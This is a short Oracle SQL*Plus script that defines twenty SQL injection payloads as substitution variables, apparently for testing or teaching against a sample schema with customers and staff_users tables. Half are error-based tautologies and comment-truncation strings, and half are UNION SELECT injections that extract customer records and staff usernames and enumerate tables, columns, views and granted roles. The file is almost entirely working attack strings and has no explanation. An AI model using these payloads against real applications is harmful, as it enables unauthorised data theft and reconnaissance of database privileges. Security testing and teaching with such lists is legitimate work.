-- payloads.sql
SET VERIFY OFF

-- ===== Error-based payloads =====
DEFINE E1  = '''Ali Hassan'''
DEFINE E2  = ''' OR ''1''=''1'''
DEFINE E3  = ''' OR 1=1 --'''
DEFINE E4  = ''' OR 1=2 --'''
DEFINE E5  = '''Ali Hassan'' --'''
DEFINE E6  = '''Ali Hassan'' + 1'''
DEFINE E7  = ''' || UPPER(username) || '''
DEFINE E8  = '''Ali Hassan'' AND 1=TO_NUMBER(''ABC'')'''
DEFINE E9  = '''Ali Hassan'' SELECT'''
DEFINE E10 = '''Ali Hassan'''

-- ===== UNION-based payloads =====
DEFINE U1 =  UNION SELECT customer_id FROM customers --
DEFINE U2 =  UNION SELECT customer_id, full_name, email, country FROM customers --
DEFINE U3 =  UNION SELECT customer_id, full_name, email FROM customers --
DEFINE U4 =  UNION SELECT full_name, customer_id, email FROM customers --
DEFINE U5 =  UNION SELECT table_name, NULL, NULL FROM user_tables --
DEFINE U6 =  UNION SELECT column_name, data_type, NULL FROM user_tab_columns WHERE table_name='CUSTOMERS' --
DEFINE U7 =  UNION SELECT view_name, NULL, NULL FROM user_views --
DEFINE U8 =  UNION SELECT staff_id, username, role_name FROM staff_users --
DEFINE U9 =  UNION SELECT username, granted_role, NULL FROM user_role_privs --
DEFINE U10 = UNION SELECT NULL, NULL, NULL FROM dual --
